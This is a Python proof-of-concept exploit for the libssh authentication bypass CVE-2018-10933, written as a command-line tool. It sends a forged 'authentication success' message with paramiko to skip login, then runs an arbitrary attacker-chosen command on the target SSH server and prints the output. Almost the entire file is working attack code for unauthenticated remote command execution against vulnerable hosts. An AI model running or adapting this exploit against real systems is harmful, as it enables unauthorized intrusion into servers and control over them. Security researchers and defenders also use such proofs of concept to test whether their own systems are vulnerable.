#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# Proof of concept of libssh-authentication-bypass-cve-2018-10933.
# https://www.cvedetails.com/cve/CVE-2018-10933/
#
# Parts of this code is not my doing, it's been put together with glue, spit and
# ducktape from several sources that are listed below
# - http://www.vulnspy.com/en-libssh-authentication-bypass-cve-2018-10933/libssh_authentication_bypass_vulnerability_exploit_(cve-2018-10933)/
# - http://joelinoff.com/blog/?p=905 
#
# Additional code was written by Are Hansen (are(@)bifrozt.com)
#
#
import paramiko
import socket
import argparse
import logging
import sys
import time
import datetime


def parse_args():
    """Arguments, argument, arguments! """
    parser = argparse.ArgumentParser(prog=sys.argv[0],
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=('Libssh Authentication Bypass (CVE-2018-10933)\n'))

    host = parser.add_argument_group('- Target options')
    host.add_argument(
                     '-H', 
                     dest='rhost',
                     help='Remote host (IPv4 or FQDN)',
                     required=True
                     )
    host.add_argument(
                     '-P',
                     dest='rport',
                     help='Remote SSH port (default: 22)',
                     type=int,
                     default=22
                     )

    sshexec = parser.add_argument_group('- Command')
    sshexec.add_argument(
                        '-C',
                        dest='rexec',
                        help='Command to execute (default: uptime)',
                        type=str,
                        default='uptime',
                        nargs='+'
                        )

    args = parser.parse_args()
    return args


def bypass_libssh(rhost, rport, rexec):
    """Do some magic stuff and profit. """
    sock = socket.socket()
    try:
        #logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
        sock.connect((str(rhost), int(rport)))
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
        session = transport.open_session()
        session.exec_command(rexec)
        data = ''
        maxseconds = 5
        start = datetime.datetime.now()
        start_secs = time.mktime(start.timetuple())
        while True: 
                if session.recv_ready():
                    data = data+session.recv(2048)
                if session.exit_status_ready():
                    break
                now = datetime.datetime.now()
                now_secs = time.mktime(now.timetuple()) 
                et_secs = now_secs - start_secs
                if et_secs > maxseconds:
                    data = data+'\ntimeout'
                    break
        print(data)
        return 0

    except paramiko.SSHException as e:
        print('[FATAL] - TCPForwarding disabled, {} not vulnerable'.format(rhost))
        return 1
    except socket.error:
        print('[FATAL] - Cant connect to {} using port {}'.format(rhost,rport))
        return 1


def check_args(args):
    """Take arguments, mix gently with function and bake quickly. """
    bypass_libssh(args.rhost, args.rport, args.rexec)


def main():
    """Doing what a main function does... """
    args = parse_args()
    check_args(args)


if __name__ == '__main__':
    main()

